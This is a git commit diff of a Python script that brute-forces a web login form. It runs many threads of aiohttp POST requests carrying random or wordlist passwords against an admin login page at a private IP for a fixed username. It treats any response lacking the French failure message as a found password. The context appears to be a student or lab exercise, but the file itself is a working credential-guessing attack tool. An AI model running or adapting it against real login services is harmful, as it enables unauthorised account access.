c63076b94c4c2657b68d181b240964ff1bf01182
andre-rupied <163013463+andre-rupied@users.noreply.github.com>
2024-11-08 13:55:19 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,9 +1,12 @@
+
 import aiohttp
 import asyncio
 import random
 import string
 import threading
+import os, time
 
+path = None
 count = 0
 found_event = threading.Event()
 
@@ -12,31 +15,44 @@ async def gen():
     characters = string.ascii_letters + string.digits
     random_string = ''.join(random.choice(characters) for _ in range(length))
     return random_string
+    
+    
+async def list_pass(path, count):
+    f = open(path, "r")
+    lines = f.read().splitlines()
+    if count < len(lines):
+        return lines[count]
+    else:
+    	return None
+
 
 async def main():
-    
     while not found_event.is_set():
-        _pass = await gen()
-        if len(_pass) == 8:#sinon c'était trop long
-            _pass = "jux7g"
 
         global count
+        if path:
+            _pass = await list_pass(path, count)
+            if _pass == None:
+            	break
+        else:
+            _pass = await gen()
         count +=1
         try:
             async with aiohttp.ClientSession() as session:
-                async with session.post("http://localhost/sio2/arupied/gsbfrais/index.php?uc=connexion&action=valideConnexion",
-                                        data={"login": "lvillachane", "mdp": _pass}) as r:
+                async with session.post("http://10.0.0.42/admin/admin_check_id.php",
+                                        data={"user": "stagiaire_user", "pass": _pass}) as r:
                     text = await r.text()
-                    if "Login ou mot de passe incorrect" in text:
+                    
+                    if found_event.is_set():
+                        break
+                    if "Mauvais utilisateur / mot de passe" in text:
                         print(f"total requests: {str(count)}, false: {_pass}")
+
                     else:
                         print(f"total requests: {str(count)}, true: {_pass}")
                         found_event.set()
-                        break
-                    if _pass == "jux7g":  # verification supplémentaire si la connection ne fonctionne pas
-                        print("its the real path")
-                        found_event.set()
-                        break
+                        return
+
         except:
             continue
 
@@ -61,5 +77,23 @@ if "__main__" == __name__:
             break
         else:
             print("please enter a number (int) between 1 - 100 000")
+    while True:
+        passes = input("1 - gen passwords (default) \n2 - use a password list\n>>>")
+        if passes == "1":
+            break
+        elif passes == "2":
+            while True:
+                path = input("enter your path (ex:\"./file.txt\") : ")
+                if os.path.exists(path):
+                    path = path
+                    break
+                else:
+                    print("please verify if your file path is correct")
+            break
+        else:
+            print("bad choice, pleas choose only between the available purposes.")
+    	
     start_threads(num)
+if path:
+    print("end of passwords list.")
 input()
